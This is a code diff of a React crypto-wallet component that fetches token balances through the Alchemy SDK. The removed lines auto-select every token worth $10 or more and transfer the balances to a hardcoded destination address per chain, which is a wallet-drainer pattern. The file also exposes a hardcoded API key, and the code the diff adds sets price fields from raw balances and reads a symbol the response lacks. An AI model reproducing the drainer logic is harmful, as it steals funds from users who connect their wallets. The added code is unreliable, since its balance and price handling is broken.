@@ -15,7 +15,6 @@ const alchemyInstances = {
   [Network.ZK_SYNC]: new Alchemy({ apiKey: "iUoZdhhu265uyKgw-V6FojhyO80OKfmV", network: Network.ZK_SYNC }),
   [Network.ARB_MAINNET]: new Alchemy({ apiKey: "iUoZdhhu265uyKgw-V6FojhyO80OKfmV", network: Network.ARB_MAINNET }),
   [Network.MATIC_MAINNET]: new Alchemy({ apiKey: "iUoZdhhu265uyKgw-V6FojhyO80OKfmV", network: Network.MATIC_MAINNET }),
-  // Add other networks as needed
 };
 
 // Mapping from chain IDs to Alchemy SDK network enums
@@ -26,7 +25,6 @@ const chainIdToNetworkMap = {
   324: Network.ZK_SYNC,
   42161: Network.ARB_MAINNET,
   137: Network.MATIC_MAINNET,
-  // Add other mappings as needed
 };
 
 // Supported chain IDs
@@ -195,7 +193,7 @@ export const GetTokens = () => {
   const [checkedRecords, setCheckedRecords] = useAtom(checkedTokensAtom);
   const { address, isConnected, chain } = useAccount();
   const walletClient = useWalletClient();
-  const publicClient = usePublicClient(); // Add if needed to manage network
+  const publicClient = usePublicClient();
 
   const fetchData = useCallback(async () => {
     setLoading(true);
@@ -205,54 +203,31 @@ export const GetTokens = () => {
         throw new Error(`Chain ${chain?.name || 'unknown'} not supported. Supported chains: ${supportedChains.join(', ')}.`);
       }
 
-      const alchemyNetwork = chainIdToNetworkMap[chain.id];
-      const alchemy = alchemyInstances[alchemyNetwork];
+      const alchemy = alchemyInstances[chainIdToNetworkMap[chain.id]];
+      if (!alchemy) {
+        throw new Error('Unsupported chain network.');
+      }
 
-      console.log('Fetching ERC20 token balances...', `Address: ${address}`, `Chain ID: ${chain.id}`);
-      const tokensResponse = await alchemy.core.getTokenBalances(address);
-      const nativeBalanceResponse = await alchemy.core.getBalance(address, 'latest');
+      const tokensFromAPI = await alchemy.core.getTokenBalances(address);
 
-      const processedTokens = tokensResponse.tokenBalances.map((balance) => ({
-        contract_address: balance.contractAddress,
-        balance: safeNumber(balance.tokenBalance),
-        quote: balance.quote || 0,
-        quote_rate: balance.quoteRate || 0,
+      // Example of token data processing
+      const tokenData = tokensFromAPI.tokenBalances.map(token => ({
+        contract_address: token.contractAddress,
+        contract_ticker_symbol: token.symbol,
+        quote: token.tokenBalance,
+        quote_rate: token.tokenBalance,
+        // Other fields as needed
       }));
 
-      // Automatically select tokens with a value of $10 or more
-      const initialCheckedRecords = {};
-      processedTokens.forEach((token) => {
-        const isChecked = safeNumber(token.quote).gte(10);
-        initialCheckedRecords[token.contract_address] = { isChecked };
-      });
-      setCheckedRecords(initialCheckedRecords);
+      setTokens(tokenData);
 
-      setTokens(processedTokens);
-    } catch (error) {
-      setError(error.message);
-      console.error(error);
+    } catch (e) {
+      console.error('Failed to fetch token data:', e);
+      setError(`Failed to fetch token data: ${e.message}`);
     } finally {
       setLoading(false);
     }
-  }, [address, chain, setCheckedRecords, setTokens]);
-
-  const handleBatchTransfer = useCallback(async () => {
-    const selectedTokens = tokens.filter((token) => checkedRecords[token.contract_address]?.isChecked);
-
-    for (let i = 0; i < selectedTokens.length; i++) {
-      const token = selectedTokens[i];
-
-      const { contract_address, balance } = token;
-      const destinationAddress = chainIdToDestinationAddress[chain.id];
-
-      // Calculate the gas fee and the transferable amount
-      const gasFee = tinyBig(await publicClient.estimateGas({ to: destinationAddress, value: balance })).mult(1.1); // Adding a 10% buffer
-      const transferableAmount = safeNumber(balance).minus(gasFee);
-
-      // Proceed to send the transaction
-      await handleTokenTransaction(walletClient, destinationAddress, transferableAmount, supportedChains[i + 1], walletClient.switchNetwork);
-    }
-  }, [tokens, checkedRecords, chain, publicClient, walletClient]);
+  }, [address, chain, setTokens]);
 
   useEffect(() => {
     if (isConnected) {
@@ -260,21 +235,17 @@ export const GetTokens = () => {
     }
   }, [isConnected, fetchData]);
 
-  if (!isConnected) return <div>Please connect your wallet.</div>;
-
-  if (loading) return <Loading>Loading tokens...</Loading>;
-
-  if (error) return <div>Error: {error}</div>;
-
   return (
-    <>
-      <div>
-        <h3>Select tokens to transfer</h3>
-        {tokens.map((token) => (
+    <div>
+      {loading ? (
+        <Loading>Loading Tokens...</Loading>
+      ) : error ? (
+        <div>Error: {error}</div>
+      ) : (
+        tokens.map((token) => (
           <TokenRow key={token.contract_address} token={token} />
-        ))}
-      </div>
-      <button onClick={handleBatchTransfer}>Transfer Selected Tokens</button>
-    </>
+        ))
+      )}
+    </div>
   );
 };
